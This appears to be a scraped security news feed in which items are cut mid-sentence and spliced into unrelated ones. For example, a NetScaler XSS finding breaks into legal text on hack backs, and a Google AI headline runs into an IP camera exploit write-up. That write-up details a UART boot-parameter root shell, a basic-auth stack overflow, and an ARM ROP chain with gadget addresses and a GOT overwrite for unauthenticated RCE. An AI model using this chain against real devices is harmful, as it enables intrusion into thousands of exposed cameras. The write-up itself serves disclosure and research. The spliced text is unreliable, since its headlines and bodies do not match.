After reviewing the issue, we’ve determined that the behavior stems from a misconfiguration of the appliance. Specifically, configuring a AAA virtual server without enabling the AAA feature is not a recommended setup. **Please note that the authentication functionality will not operate unless the AAA feature is enabled.**

Our documentation provides guidance on this configuration: https://docs.netscaler.com/en-us/citrix-adc/current-release/aaa-tm/entities-of-authentication-authorization-auditing/authentication-virtual-server.html

However, we understand that some customers may inadvertently configure their appliances this way. To help prevent this unsupported configuration in the future, we’ve made changes in the code that will prevent it going forward.

We can’t say we disagree - their assessment is fair and pragmatic, there is a all-but-zero chance of this vulnerability actually existing in the wild.

However, what should be of concern is the bigger picture - the trend, very clearly suggesting that memory management continues to appear very fragile within Citrix NetScaler appliances, to the extreme that even just misconfiguring an appliance by accident leads to disclosure of leaked memory.

It feels like we are playing catch with a highly-sensitive gun that continues to harm innocent bystanders - within, once again, what many will consider a highly-critical appliance and security control.

Will we see another memory leak vulnerability in Citrix NetScaler? We have no idea. But if we were to meme…

### WT-2025-0090 - SAML RelayState Reflected XSS

While poking around the appliance, we identified what looked like a simple and trivial Open Redirect vulnerability within the SSO flows used by Citrix NetScaler - specifically in the usage of the `RelayState` parameter.

For example, the below HTTP POST request contains a `RelayState` parameter with a base64 encoded value of “https://watchTowr.com”:

Although hack backs can take on various forms, they are—­by definition­—not passive defensive measures.”As the law currently stands, specific forms of purely defense measures are authorized so long as they affect only the victim’s system or data.At the other end of the spectrum, offensive measures that involve accessing or otherwise causing damage or loss to the hacker’s systems are likely prohibited, absent government oversight or authorization. And even then parties should proceed with caution in light of the heightened risks of misattribution, collateral damage, and retaliation.As for the broad range of other hack back tactics that fall in the middle of active defense and offensive measures, private parties should continue to engage in these tactics only with government oversight or authorization. These measures exist within a legal gray area and would likely benefit from amendments to the CFAA and CISA that clarify and carve out the parameters of authorization for specific self-defense measures. But in the absence of amendments or clarification on the scope of those laws, private actors can seek governmental authorization through an array of channels, whether they be partnering with law enforcement or seeking authorization to engage in more offensive tactics from the courts in connection with private litigation.]]></content:encoded></item><item><title>[Webinar] Learn How Leading Security Teams Reduce Attack Surface Exposure with DASR</title><link>https://thehackernews.com/2025/11/webinar-learn-how-leading-security.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjb7usGljMR3vSfxxk9XeKY39fUcIRMFDq6GOy0OEA_AK7P4ybAoHwl9Ga45OJ5pZPzpDhwqZ0D6PKEI-IFFifcl-NWBM5ymJ6wcNSyL3bneCMbRbVGz1ca3MIaKDHWbNvOVzK1LinCOt0RLYF1-zb_Zy11bGddkRxowymBu754CFJDpCDIreh4iiGF4loK/s1600/cyberteams.jpg" length="" type=""/><pubDate>Wed, 12 Nov 2025 11:55:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Every day, security teams face the same problem—too many risks, too many alerts, and not enough time.

By chaining it with other attacks, they can gain full admin access, install malware, steal data, or make deeper changes you wouldn’t normally be able to undo. Run Windows Update today, restart your PC, and check you’re up to date.Microsoft releases important security updates on the second Tuesday of every month—known as “Patch Tuesday.”  This month’s patches fix critical flaws in Windows 10, Windows 11, Windows Server, Office, and related services.Particularly noteworthy are some critical Remote Code Execution (RCE) bugs in Microsoft Graphics and Office that can allow attackers to run malicious code just by convincing someone to open a booby-trapped file or document.A “zero-day” is a software flaw that attackers are already exploiting before a fix is available. The name comes from the fact that defenders have  to protect themselves—attackers can strike before patches are released. In this month’s update, Microsoft fixed one such vulnerability: CVE-2025-62215, a Windows Kernel Elevation of Privilege (EoP) flaw.It lets an attacker who already has local access to a device gain higher, admin-level permissions by exploiting what’s known as a “race condition.” A race condition vulnerability happens when different programs or processes try to use the same resource at the same time without proper coordination. During that brief window of confusion, attackers can slip through and exploit the system.Attackers need to combine this vulnerability with other attack methods. Once they’ve compromised a system, they use this vulnerability to escalate privileges and gain admin-level rights.Another critical vulnerability worth noting is CVE-2025-60724, which comes with a CVSS score of 9.8 out of 10. It’s a heap-based buffer overflow in the GDI+ Microsoft Graphics Component, which allows an unauthorized attacker to run malicious code over a network.A buffer overflow happens when software writes more data to memory than it can handle, potentially overwriting other areas and injecting malicious code. In the case of CVE-2025-60724, Microsoft warns that attackers could exploit the flaw by convincing a victim to download and open a document that contains a specially crafted metafile. In more advanced attacks, the same vulnerability could be triggered remotely by uploading a malicious file to a vulnerable web service.How to apply fixes and check you’re protectedThese updates fix security problems and keep your Windows PC protected. Here’s how to make sure you’re up to date:Click the  button (the Windows logo at the bottom left of your screen).Click on  (it looks like a little gear).In the Settings window, select  (usually at the bottom of the menu on the left).Click the button that says .Windows will search for the latest Patch Tuesday updates for November 2025.If you have selected automatic updates earlier, you may see this:Which means all you have to do is restart your system and you’re done updating.If not, continue with the below.If updates are found, they’ll start downloading right away. Once complete, you’ll see a button that says  or .Click if needed and follow any prompts. Your computer will usually need a restart to finish the update. If it does, click .5.

Systems are protected, definitions are up to date, behavioral analysis is active. Then, suddenly, files across your network start getting encrypted. Backups are being deleted. Ransom notes appear across your machines. Your security software shows nothing. No alerts, no detections, no blocked processes. How is this possible? This isn’t a hypothetical situation. It’s a real attack technique that ransomware operators are actively using to bypass even sophisticated protection systems. The attack exploits a fundamental assumption in how security software operates: that the malicious process and the files being attacked are on the same machine. When that assumption breaks down, traditional defenses fail. Malwarebytes ransomware protection works through multiple defensive layers. These include AI-based analysis, machine learning models, signature detection, runtime sandboxing, exploit mitigation, and web protection. Each layer stops threats at different stages. The Anti-Ransomware behavioral layer monitors actual file encryption behavior in real time. Malwarebytes continuously enhances all layers of its defense.  This article discusses a recent innovation in our Anti-Ransomware behavioral monitoring technology. The result is a comprehensive enhancement incorporating innovations in file monitoring, network session tracking, behavioral analysis, and real-time threat correlation. Why traditional protection failsTo understand why a ransomware attack over a network is so effective, we need to understand how this technology  works. The Anti-Ransomware component sits between applications and the file system, allowing it to see every file operation before it completes. When a process tries to open, read, or write a file, specialized callbacks are triggered. Think of these as security checkpoints where the security driver can inspect what’s happening and decide whether to allow the operation. The software looks at patterns: Is this process rapidly encrypting many files? Is it adding suspicious extensions? Is it attempting to delete backup Copies? These behavioral indicators, when combined, signal ransomware. This architecture works brilliantly when the ransomware process and the files being encrypted are on the same machine. The driver sees the process, tracks its behavior over time, builds a threat profile, and can block it before significant damage occurs. But what happens when ransomware runs on one device and attacks files on another? For example, an attacker compromises an unprotected device, a legacy device without current protection or an unmanaged guest device, and uses it to encrypt files on protected systems through network shares. Your machine doesn’t see any suspicious programs running. It just looks like someone is accessing files over the network, which happens all the time. This creates a perfect hiding spot for ransomware. On the attacking device, there might be no security software installed. On your main PC where files are being encrypted, the security software sees files changing but can’t tell which program is causing it. The connection between the malicious program and your files is hidden. Multiple ransomware variants have adopted this technique. They use specific commands to target network folders and shared drives. These aren’t random attacks. They’re carefully designed to bypass security software through remote encryption These aren’t opportunistic attacks. They’re carefully engineered for bypassing traditional anti-ransomware protection through remote encryption. Two-part protection architectureSolving this problem required addressing two distinct attack vectors. Part 1 involves a local process attacking remote files, while Part 2 involves a remote process attacking local files. Each required different technical approaches. Part 1: Detecting local to remote attacksWhen a program tries to access files on your network or shared folders, Malwarebytes checks if it’s behaving suspiciously. If the program is rapidly changing many files and creating ransom notes, the system builds a threat score in real time. The key innovation is that Malwarebytes tracks local and network activity separately. A program might be safely working with files on your computer while attacking files on another device through the network. By monitoring both, we can catch ransomware without false alarms. When Malwarebytes detects ransomware behavior, it blocks the malicious program immediately, stopping the attack before your files are encrypted. Part 2: Detecting remote to local attacksThe second challenge is harder: what if the ransomware is running on another device and attacking your files remotely? There’s no malicious program on your computer to block. Our solution tracks network connections. When files are accessed from another device on your network, Windows keeps information about which device is connecting. Malwarebytes captures this information and watches for suspicious behavior, like rapidly changing many files, adding suspicious file extensions, or creating ransom notes. When we detect an attack coming from another device, we block that specific connection from accessing your files. Innovation in ransomware protectionOur implementation operates through our specialized components. This architecture is essential for both performance and security. Every file operation goes through our filter, so we need to process decisions in microseconds to avoid impacting system responsiveness. We implemented multiple optimization layers. First, we filter out file operations that categorically cannot be ransomware related. Opening a file for read only access is not a threat, so we skip detailed analysis. Operations that only query metadata happen constantly in Windows and can be safely ignored for ransomware detection purposes. For operations that require analysis, we implemented a sophisticated indicator time-to-live (TTL) system. Behavioral indicators decay over time. This prevents false positives from legitimate activities like file synchronization tools or backup software. The network session tracking component required deep integration with Windows networking. We extract session information by accessing internal structures that Windows uses for network file serving. Our exclusion system supports IPv4, IPv6, hostnames, and CIDR notation for network ranges. What makes this protection differentSeveral factors distinguish the Malwarebytes approach from other solutions. The first is comprehensiveness. Many security vendors address this partially. Remote processes attacking local files or where local processes attack remote files. An attacker who compromises a single endpoint can still encrypt the shared resources. Malwarebytes protects against both vectors. Second is precision. Many solutions block entire network connections or lock accounts when they detect threats. Malwarebytes is more precise. We block only the specific malicious connection. Other activities from the same device continue working normally. Only the ransomware’s access is stopped. Third is performance. Malwarebytes runs efficiently without slowing down your computer. Fourth is proven protection. This technology has been tested and deployed across many different business and home networks. It is proven to work in real world situations. This protection does more than just stop one type of ransomware attack. It represents a new way of thinking about network-aware security. The old approach treated each device separately, but that doesn’t work when attackers use network connections to spread threats. Security solutions need to understand that attacks can come from any device on the network and target any accessible files. The technology we’ve built can do more than stop ransomware. The same system that tracks network connections and monitors suspicious behavior can help detect other threats, like someone trying to steal your data or access files they shouldn’t have permission to view. Attackers will keep evolving their methods. The attacks we’re seeing now will become more sophisticated. They might try to disguise themselves as normal computer maintenance or file management. Our protection is designed to adapt. Because it watches for suspicious patterns of behavior rather than looking for specific known attacks, it can detect new variations without needing constant updates. Ransomware keeps evolving, and attackers constantly find new ways to bypass security. Malwarebytes is committed to staying ahead with real innovation. This enhancement closes a critical gap that many security programs don’t address until it’s too late. If you’re choosing security software or reviewing your current protection, ask yourself: Does it protect against ransomware that spreads through network shares? This is becoming increasingly important as more ransomware attacks use this technique. We don’t just report on threats—we remove them]]></content:encoded></item><item><title>MacOS Infection Vector: Using AppleScripts to bypass Gatekeeper</title><link>https://pberba.github.io/security/2025/11/11/macos-infection-vector-applescript-bypass-gatekeeper/</link><author>/u/dashboard_monkey</author><category>netsec</category><pubDate>Wed, 12 Nov 2025 09:19:22 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Google Launches &apos;Private AI Compute&apos; — Secure AI Processing with On-Device-Level Privacy</title><link>https://thehackernews.com/2025/11/google-launches-private-ai-compute.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7u0YyGlwQEZFWpce5m9bHa4DibuFf1-votoLyZ6m1wkceOdtkkpGLrjkM9tyYHVQJVZSz5KQvJ9FxxCcr7KFlWm_d9DKdDx84iYRRp7J7rQHYRlAMdhF65AYDLZT_T-FWmwdXzULM-r1oHGTPENO8-oluI3HcVTXYUG3Pu-0m4IEhC0M6PLYVxgt_JWaQ/s1600/google-ai.gif" length="" type=""/><pubDate>Wed, 12 Nov 2025 08:35:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Google on Tuesday unveiled a new privacy-enhancing technology called Private AI Compute to process artificial intelligence (AI) queries in a secure platform in the cloud.

In this follow-up post, I will take you through building a considerably more complex binary exploit. We will explore the path from firmware extraction and analysis to the discovery of a previously unknown vulnerability and its exploitation. Follow along as we build an ARM ROP chain to bypass ASLR without an address leak, and achieve unauthenticated RCE.I examined the IN-8401 2K+, an IP camera from the German manufacturer INSTAR. It’s a modern networked surveillance camera that exposes a web-based user interface for configuration and live view. As I later found this particular model shares its firmware with other devices from INSTAR’s 2K+ and 4K series. According to Shodan there are roughly 12,000 INSTAR devices visible on the public internet.Before we can meaningfully hunt for vulnerabilities, we need to gain access to the device to obtain its firmware. Access to the firmware exposes binaries, configuration files, scripts and the filesystem layout and enables both static inspection and dynamic testing. Without the firmware we’re stuck with blind fuzzing of the network interface.It’s always a good idea to collect as much information as possible before diving into analysis mode. So I started with some reading. INSTAR provides quite an extensive documentation about its cameras and their features. I found a very interesting page titled “Restore your HD Camera after a faulty Firmware upgrade”. The article explained that the camera exposes a UART interface and how it could be accessed to restore a firmware image. UART is a hardware interface used for serial communication commonly found on development boards, embedded systems, and debugging interfaces. In the documentation it looked like it’s possible to boot right into a root shell.Although the article was written for the HD camera models, not my 2K+, I figured it might be worth a shot, since manufacturers often reuse features and components across different product versions. I removed the front part of the housing and spotted the debugging interface as shown on the wiki page.I went ahead and attached some PCBites to the interface and connected them to a FTDI, which is a small USB-to-serial converter.I then plugged the FTDI into my Linux machine and connected to it. After supplying some input over the serial connection I was greeted with a login prompt, cool!I tried a couple of the usual combinations like admin:admin, root:root, and so on, but had no success. The documentation explained that the boot process could be interrupted to obtain a root shell on the device’s OS. So I rebooted the camera to see if that worked.As you can see there was indeed a mechanism to stop the device from autobooting. But contrary to what the documentation suggested, interrupting the boot process didn’t provide a root shell on the OS, only in the U-Boot bootloader. U-Boot (short for Universal Bootloader) is an open-source bootloader commonly used in embedded systems to initialize hardware and load the operating system or firmware during startup.I noticed that the Kernel boot parameters were provided by an environment variable called . I went ahead an tried the  trick which tells the Kernel to start a shell instead of the init process. I updated the variable accordingly and tried to boot using .It worked. I added a new root user and rebooted the device. Now I was able to login to the device using the newly created user. I dumped the whole filesystem for analysis and as a backup so I could also restore it later, if anything went wrong along the way.High-Level Architecture & Attack SurfaceWith the device unlocked and open for exploration it’s very easy to get swept away by curiosity. With the goal of finding exploitable vulnerabilities in mind it’s important to lay out something like an attack surface map first.The web stack consisted of various components, most prominently a lighttpd web server that acted as an entry point and reverse proxy. I started by inspecting its configuration to see what it was doing. As you would expect from a reverse proxy, incoming requests were forwarded to the appropriate backend. For example, requests to files ending with  were routed to the fcgi_server binary through a socket at .I was mainly interested in finding code that was reachable without authentication. From my initial exploration I knew that there was an SQLite database file where the web interface users were stored, so the binary that performed authentication had to access this file. However, I couldn’t confirm that  was interacting with it. I concluded another component must be involved. In the process list I noticed a process called . I attached  to see what it was doing and found that incoming requests for most endpoints were forwarded from  to  via .As you can observe, the HTTP request wasn’t forwarded as-is, it was first serialized using some type of Type–Length–Value (TLV) structure. These observations also made it clear that authentication and the core application logic reside in the  backend.With this, I had identified two interesting targets:  and , both of which were reachable by an unauthenticated attacker.With the two main targets  and  identified we can now focus on searching for vulnerabilities. In this section I want to quickly touch on the methods I employed for doing so.Probably one of the most important ingredients for efficient vulnerability hunting is having a proper debugging setup in place. This allows for quickly double-checking any assumptions made during static analysis, tracing calls, and so on. I ran more or less an identical setup to the one used in the last research with a gdb server on the IP camera and a gdb client on the attacker’s machine.For this research I primarily used two approaches: fuzzing, and a combination of static and dynamic analysis. I started off with something that I would call a very primitive way of black-box fuzzing using boofuzz on collected web endpoints. I tried fuzzing through all possible parameters I had found on various endpoints to see if I could trigger a crash. Although this approach yielded CVE-2025-8761, I felt like it was very inefficient as a crash of the whole system was the only thing I was able to reliably detect (more on that later).As a secondary approach I spent quite some time on reverse engineering the two binaries  and . I tried to get an understanding of how things work while focusing on the usual suspects for memory corruption like bounds checking, pointer arithmetic, etc. To speed things up my process usually involved examining the decompiled binary, making assumptions, and verifying them using  and  dynamically.Let’s have a look at some code. As described earlier  acted as some sort of custom middleware that translated web requests into ipc messages. In the decompiled binary I found a dispatcher for  endpoints which called certain handler functions based on the given URI.In most of the handler functions a similar pattern emerged. Inside each handler there was a call to the same function which looked like another dispatcher. I identified the second dispatcher as some sort of authentication handler.I assumed that the code had to extract and serialize the corresponding auth data from http requests differently, depending on the authentication mechanism used. There were several different handlers one of which I identified as the basic auth handler.Inside the basic auth handler, there was a call to another function that looked like a custom implementation of Base64 decoding. As you might have noticed, the decompiled code contained typical C++ elements such as class methods, this pointers, and references to the C++ standard library. Most of the string-related functionality I had seen so far was therefore using C++’s standard string handling. In this case, however, I noticed a  that copied the decoded Base64 result into a fixed-size buffer (516 bytes) located on the stack.Without spending much more time on static analysis, I moved on to perform some dynamic testing of the basic authentication functionality. First, I needed to verify my assumption that the basic auth handler and Base64 decode function were being triggered, so I set a few breakpoints and sent a request.The breakpoints triggered which confirmed my assumptions so far and I got back a 500.Then I sent another request with a very long basic auth string exceeding the 516 buffer length in the base64 decode function.I got back another 500. However, the response wasn’t the same, this time it included an HTML error message. Strange, right? Let’s have a look at what the serial terminal showed.What happened? The program had crashed.  indicates that I had overwritten the stack since the code took the return address from the stack and tried jumping to it. In this case  which corresponds to the payload sent. I had found a stack-based buffer overflow.Why hadn’t I discovered this vulnerability during my initial fuzzing? I figured there were two reasons:The HTTP status code was the same as for a normal request, only the response body differed. So getting a 500 response to the request was nothing unusual.The lighttpd server immediately restarted , so the crash wasn’t noticeable from an outside perspective.This once again highlights the importance of a proper debugging setup.Before we jump to the fun part, a quick heads up: If you’re not familiar with binary exploitation or the ARM architecture I’d recommend to have a look at the previous blog post first as many concepts are similar to those from the previous research and won’t be described in detail in this post.Let’s first discuss the preconditions of exploiting the discovered stack-based buffer overflow. We’re dealing with an ARMHF 32 bit binary, dynamically linked and stripped. As shown by  the target binary isn’t protected by stack canaries, but does have the NX mitigation enabled. It isn’t compiled as a position independent executable (PIE) and has partial relocation read-only (RELRO).What does this mean for us as attackers? Overwriting return addresses on the stack with an overflow is straightforward because of the lack of stack canaries. However, we can’t execute shellcode on the stack. Also, the binary will always be placed in the same memory region, because it wasn’t compiled as a PIE. Finally, partial RELRO means that the global offset table (GOT) comes before the BSS section in memory, which holds uninitialized global and static variables. This eliminates the risk of a buffer overflow from a global variable overwriting GOT entries. Since our overflow is on the stack, this doesn’t really matter to us. What does matter though, is that it also means that the GOT is writable. Only full RELRO provides a read-only GOT.Let’s also have a look at the libraries included by the target binary such as the libc. We can see that libc was compiled with PIE, meaning that it can be placed randomly in memory during runtime.Evidently, when looking at the mitigations in place, it makes sense to consider a Return-oriented programming (ROP) chain to achieve command execution. A ROP chain leverages small code snippets, or gadgets, already present in a program’s memory. By linking these gadgets, an attacker constructs an unintended, attacker-controlled execution flow. The effectiveness of a ROP chain depends on the availability of suitable gadgets and the attacker’s knowledge of their memory addresses.In our case we could use gadgets from the target binary () itself because their addresses are static and therefore known. These gadgets are quite limited though and eventually we would need to call file I/O functions or  provided by libc to gain command execution. Note that libc was compiled with PIE. I quickly confirmed on the device that address space layout randomization (ASLR) was enabled, so libc was indeed placed at a random address in memory.I came up with a couple of ideas on how to deal with this:Find a libc address leak through another vulnerabilityFind a file read for /proc/self/mapsLeak a libc address through a ROP chainUnfortunately, I couldn’t quickly find another vulnerability that would let me leak a libc address. I considered reading  to locate libc, but that proved unsuccessful. I also looked into using gadgets in the target binary to build a ROP chain to leak a libc address. However, there was no straightforward way to exfiltrate the leaked pointer.A bigger issue was that any ROP chain would eventually crash the binary, rendering the leak useless because libc would be relocated on the next start of . In a stack-based buffer overflow, it’s also impossible to restore the stack to its previous state, as the very information required for restoration is overwritten.One approach often used in this kind of scenario is to trigger the bug multiple times to prolong the crash: trigger it once to leak an address, then return to the vulnerable function and trigger the overflow again to make use of the leak. However, that approach requires an I/O channel to read the leak and then supply input again. Given the web-stack architecture we discussed and the bug’s location, that wasn’t feasible, so I concluded a one-shot exploit was likely the only viable option.There are several known techniques that revolve around the GOT and Procedure Linkage Table (PLT) to bypass ASLR. When a call to an external function such as  (libc) is made, the immediate call goes to  which acts as a resolver of the actual address of  within libc. The resolved address is then stored in the GOT. If a specific function has already been resolved previously it is taken from the GOT by the  stub.So the information needed to bypass ASLR lives in the GOT. Ideally we’d find the address of  there, but the target binary never references , so it has no GOT/PLT entry. Instead, we could read a GOT entry for another function, compute the offset from that function to our target, and use that to redirect execution to the target. But all of this must be done via a ROP chain built from gadgets available in the binary.The high level steps would look something like this:Read a GOT entry and store in register xIncrement/decrement register x to reach target function (eg. addition, multiply, etc.)Increment/decrement value pointed to by GOT pointer to reach target function (GOT is writable)Dereference GOT pointer into register xStill a vast simplification, we would still need to move arguments into the correct registers and so on before jumping to the target function  but it’s a starting point.To pursue this idea I first wanted to find a GOT entry that is already populated when triggering the vulnerability. Within the vulnerable base64 decode function there is a call to  which is a libc function. Let’s have a look at its PLT and GOT entries.Using  we can see the address of the PLT entry inside  of To verify the corresponding GOT entry and actual address at runtime I set a breakpoint at the return statement after the overflow.As you can see the GOT entry is at  which points to the actual address of  at  within libc.Let’s see how far apart that  (0x76ba86f0) and  (0x76bbb920) are.So that means that if we can add 0x13230 to the address at  we have the address of .Gadgets, Gadgets and more GadgetsNow to the tedious part. The only thing between the high-level plan and RCE was a bunch of gadgets, right? I initially tried tools such as  to find and automatically chain gadgets, but ARM assembly offers many different, often multi-instruction ways to perform simple operations, e.g. add to a register or move values between registers. Those tools handle obvious, straightforward gadgets well, but they struggle once the gadget sequences become more complex. So in the end I reverted to manually searching and chaining gadgets with .If no short, straightforward gadgets are available, you must resort to longer ones. Typically, the longer a gadget is, the more side effects it has, for example, overwriting registers or changing the stack pointer. The challenge is therefore to find gadgets that implement the required primitive while introducing only manageable side effects that later gadgets can correct.The most crucial gadget in my chain was the one to add two values, preferably fully controllable. This would let me add the calculated offset to the address at  to get the address of . While there were a couple of gadgets to add static values like 0x1 or 0x2 to a register, these didn’t seem very useful because either a loop would be required to call them many times or the chain would become too long to reach the desired value. So I tried to find gadgets that added values from two registers such as the following one.# 0x000228d8: add r6, fp, r6; ldrb sb, [ip, #1]; ldr sl, [ip, #2]; blx r3;
: Adds fp (r11) and r6, stores result in r6: Dereferences ip (r12) + 1 byte, stores result in sb (r9): Dereferences ip (r12) + 2 word, stores result in sl (r10)As you can see here side effects can also mean that certain registers have to contain certain values beforehand. In this case ip (r12) has to contain a valid address that can be dereferenced. If that’s not the case, the program will crash.So we have a gadget that allows us to add fp (r11) and r6. Ideally we want the address of  in r6 and the offset we calculated earlier in fp (r11) giving us the address of  in r6 as an output of the gadget. But how do we get the address of  into r6? The address of  is known so we need a gadget to dereference it to obtain the address of  within libc.To accomplish this, let’s have a look at this gadget:# 0x000190ac: ldr r6, [r3, #0x10]; ldr r3, [r2, #4]; blx r3;
: Dereferences (r3 + 0x10), stores result in r6: Dereferences (r2 + 0x4), stores result in r3Exactly what we need, but as you can tell this gadget needs some specific preparation beforehand. To continue the chain with  we need to make sure  results in the next gadget of the chain. But that should be doable.Last but not least we need a gadget to jump to the calculated address. Unfortunately I simply couldn’t find one. I also couldn’t find ways of moving the address into another register for which call gadgets would exist. So where to go from here? I recalled that the GOT of the target binary is actually writable. So what about writing it back to the GOT? If that works we could just call  which would then load the altered address from the GOT and jump to it.Let’s try, here’s another gadget:# 0x0002a3f8: str r0, [r4, #4]; pop {r4, r5, r6, pc};
: Dereferences (r4 + 0x4) and stores value of r0: Continues the chainThis gadget enables us to store a value in r0 at . Given that we find gadgets to move our calculated address into r0 and  into r4 this allows us to write the tampered address back to the GOT.So if we could make everything line up the plan would be:Dereference  entry and store it in r6Add the calculated offset to  to the register r6Write the register r6 back to the GOT -> Prepare function arguments for The path wasn’t as straightforward as this write-up might imply. I spent quite some time trying to mix and match gadgets and even exchanged the ones discussed above numerous times until I came up with the following chain. Let me walk you through it.The function epilogue of the vulnerable base64 function conveniently allows us to populate r4 to r11 before jumping to the first gadget. So in this case I added some values to r6, r9 and r11 for later use.As a first step of the chain, we do some preparations.What we do here is basically this:Note that we store  in r3 so the following gadget can dereference it into r6. As discussed before we have to make sure that r2 contains a stack pointer so the chain can continue with .As shown above  is overwritten at runtime, so we need to make sure there is some scratch space on the stack so everything adds up properly.When jumping to the gadget at 0x1cad0 the stack looks like this:The stack pointer still points at the AAAA value. So we continue with some readjustments of the stack pointer and preparations of the r3 register.Next up is the discussed gadget to add ’s address an the calculated offset. The offset was already put into fp (r11) at the very beginning of the chain. Register r6 also contains ’s real address read from the GOT by now.The ip register can be disregarded as it won’t be used later and conveniently contained an address that points to the stack. Since we’re just reading from it, it also doesn’t invoke any undesirable side effects.As a next step we have a gadget that moves r6 into r0. So we move the calculated address (= ) into r0. Also, we prepare the r4 register for the next step. To deal with the side effects of this gadget some more padding is added.Finally, we reach the gadget that writes our calculated  address back to the GOT.To our convenience it also allows us to write  to r6.From here there isn’t much left to do. We move the stack pointer into r0 (first argument) and then call r6 which we previously populated with the address of .Attentive readers might have noticed this is a 32-bit binary, so why not just brute-force the address of ? This was indeed possible because the address space for 32-bit systems is significantly less than for 64-bit therefore the number of possible locations of libc is also a lot smaller. I used this approach for the first version of the exploit which worked fine. However, while probing for the correct address the exploit keeps crashing the target binary. If we think about a red team scenario this approach would be very noisy and should therefore be avoided. That’s why I decided to work out a more reliable exploit.We’ve now walked the full path from firmware extraction and analysis, through vulnerability identification, and exploitation. I hope reading this was as enjoyable for you as the actual research was for me.All vulnerabilities discovered during this research were reported through a responsible-disclosure process. Thanks to INSTAR for their prompt response, they fixed the issues and released an update within a short period of time. The 90-day disclosure period has elapsed, and along with this write-up the exploit is now publicly available here.]]></content:encoded></item><item><title>ISC Stormcast For Wednesday, November 12th, 2025 https://isc.sans.edu/podcastdetail/9696, (Wed, Nov 12th)</title><link>https://isc.sans.edu/diary/rss/32470</link><author></author><category>threatintel</category><pubDate>Wed, 12 Nov 2025 02:00:02 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Introducing the 2025 State of Threat Intelligence Report: Threat Intelligence Shifts from Defense to Strategy</title><link>https://www.recordedfuture.com/blog/introducing-the-2025-state-of-threat-intelligence-report</link><author></author><category>threatintel</category><enclosure url="https://www.recordedfuture.com/blog/media_1c9ad3d74e02dc4eb4b6e55581b20bdc7994c0ad9.png?width=1200&amp;format=pjpg&amp;optimize=medium" length="" type=""/><pubDate>Wed, 12 Nov 2025 00:00:00 +0000</pubDate><source url="https://www.recordedfuture.com/">Recorded Future</source><content:encoded><![CDATA[Nearly half of security leaders now use threat intelligence to guide business investments, as organizations mature their programs and 91% plan to increase spending in 2026.The third annual State of Threat Intelligence Report reveals that nearly half of security decision-makers use threat intelligence for strategic planning and investment, making it one of the most common use cases for enterprise organizations.With data breaches growing, most enterprises allocate substantial cybersecurity budgets to threat intelligence—and they plan to increase their spending in 2026.While threat intelligence maturity has improved year over year, more than half of respondents consider their organizations to be less than advanced—and almost half cite poor integration as a major challenge.More than half of security professionals expect moderate to significant changes to their threat intelligence needs in the next 12 months, and 81% said they plan to consolidate threat intelligence vendors.Discover enterprises’ threat intelligence use cases, challenges, and future plansThreat intelligence is no longer a nice-to-have—it's mission-critical. With state-sponsored attacks, cybercrime, and AI-powered threats on the rise, organizations are doubling down on threat intelligence as their secret weapon for proactive defense.The 2025 State of Threat Intelligence is Recorded Future’s third annual flagship research report designed to take the pulse of the cybersecurity industry. Incorporating data from 615 cybersecurity executives, managers, and practitioners, the report reveals enterprise organizations’ use cases, challenges, and future investment plans.By sharing what we’ve learned, we hope to help organizations make smarter decisions about their investments, vendor choices, and program maturity. And, it helps keep us grounded in the real challenges our customers face every day.Check out key themes and highlights, and then explore the report for full details.Threat intelligence usage and adoptionThe report reveals that, in 2025, enterprises increasingly trust and rely on threat intelligence to inform business-critical decisions. Not only do 43% use it to guide strategic investments and planning, but most also say it helps them make decisions related to purchasing, risk assessment, and resource allocation.Compared to 2024, a larger percentage of organizations now have full-time threat intelligence teams, and 89% pay at least one threat intelligence vendor. Find out about their top use cases, how frequently they use it, and the variety of teams across their organizations that actively consume the intelligence.Threat intelligence spending and success metricsData breaches involving a third party doubled from 2024 to 2025, so no surprise that our survey found that most enterprise organizations allocate substantial cybersecurity budgets to threat intelligence. Seventy-six percent invest $250k or more per year in external threat intelligence products (excluding services), and 14% spend more than $1 million per year.When asked about how they measure the ROI of threat intelligence, most said their organizations focus on speed and efficiency gains. See how they rank success metrics, from improved threat detection and response times to reduction in the number of incidents to cost savings from prevented incidents.Challenges with threat intelligence maturityThe survey found that threat intelligence maturity is improving year over year, with 49% of surveyed security professionals saying their maturity level is advanced. In other words, they have tools that combine outputs from multiple threat intelligence sources, a dedicated threat intelligence team, and automated workflows that integrate with most security activities including business risk assessment.As their organizations increase investment to grow their maturity, survey respondents told us they’re also experiencing challenges related to threat intelligence vendors. Almost half are frustrated by poor integration with their existing security tools, but issues ranging from vendor credibility and cost effectiveness also come into play. Explore the challenges your peers are facing on the journey to threat intelligence maturity.Future plans to strengthen threat intelligenceFinally, we asked respondents to tell us how they plan to improve their threat intelligence maturity and outcomes. Ninety-one percent said they plan to invest more in threat intelligence in 2026, and more than half expect moderate to significant changes to their threat intelligence needs in the next 12 months.Given that 81% said they plan to consolidate threat intelligence vendors, they should prioritize vendors that support the most critical capabilities across a number of use cases. See the top five capabilities our respondents prioritize in their day-to-day work.Find out where your organization stands in relation to your peersThe 2025 State of Threat Intelligence Report makes it clear: As threat intelligence delivers increasing strategic value, forward-thinking enterprises are boosting investment and evolving their use cases.Download the report to discover ideas and information that can help your organization succeed on its own maturity journey.]]></content:encoded></item><item><title>Threat Intelligence &amp; the C-Suite</title><link>https://www.recordedfuture.com/blog/ti-from-soc-to-c-suite</link><author></author><category>threatintel</category><enclosure url="https://www.recordedfuture.com/blog/media_1675c04e910df4130163445af824111e54bac26e2.png?width=1200&amp;format=pjpg&amp;optimize=medium" length="" type=""/><pubDate>Wed, 12 Nov 2025 00:00:00 +0000</pubDate><source url="https://www.recordedfuture.com/">Recorded Future</source><content:encoded><![CDATA[From Defensive Maneuvering to Proactive Decision-MakingThreat intelligence is undergoing fundamental changes in both the breadth of its capabilities and its applications. We are seeing threat intelligence evolve from a tactical defensive tool—where teams are bringing in indicators of compromise and trying to make informed decisions around known risks—to a more proactive and strategic 